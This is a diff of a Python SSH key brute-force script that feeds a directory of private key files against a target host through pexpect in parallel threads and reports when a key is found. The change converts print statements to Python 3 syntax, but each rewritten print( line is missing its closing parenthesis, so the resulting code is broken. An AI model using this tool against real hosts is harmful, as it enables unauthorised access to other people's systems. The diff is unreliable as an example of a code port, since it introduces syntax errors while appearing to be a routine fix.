@@ -25,14 +25,14 @@ def connect(user,host,keyfile,release):
         ret = child.expect([pexpect.TIMEOUT,perm_denied,\
           ssh_newkey,conn_closed,'$','#',])
         if ret == 2:
-            print '[-] Adding Host to ~/.ssh/known_hosts'
+            print('[-] Adding Host to ~/.ssh/known_hosts'
             child.sendline('yes')
             connect(user, host, keyfile, False)
         elif ret == 3:
-            print '[-] Connection Closed By Remote Host'
+            print('[-] Connection Closed By Remote Host'
             Fails += 1
         elif ret > 3:
-            print '[+] Success. ' + str(keyfile)
+            print('[+] Success. ' + str(keyfile)
             Stop = True
     finally:
         if release:
@@ -55,21 +55,21 @@ def main():
     user = options.user
 
     if host == None or passDir == None or user == None:
-        print parser.usage
+        print(parser.usage
         exit(0)
 
     for filename in os.listdir(passDir):
         if Stop:
-            print '[*] Exiting: Key Found.'
+            print('[*] Exiting: Key Found.'
             exit(0)
         if Fails > 5:
-            print '[!] Exiting: '+\
+            print('[!] Exiting: '+\
               'Too Many Connections Closed By Remote Host.'
-            print '[!] Adjust number of simultaneous threads.'
+            print('[!] Adjust number of simultaneous threads.'
             exit(0)
         connection_lock.acquire()
         fullpath = os.path.join(passDir, filename)
-        print '[-] Testing keyfile ' + str(fullpath)
+        print('[-] Testing keyfile ' + str(fullpath)
         t = Thread(target=connect,\
           args=(user, host, fullpath, True))
         child = t.start()
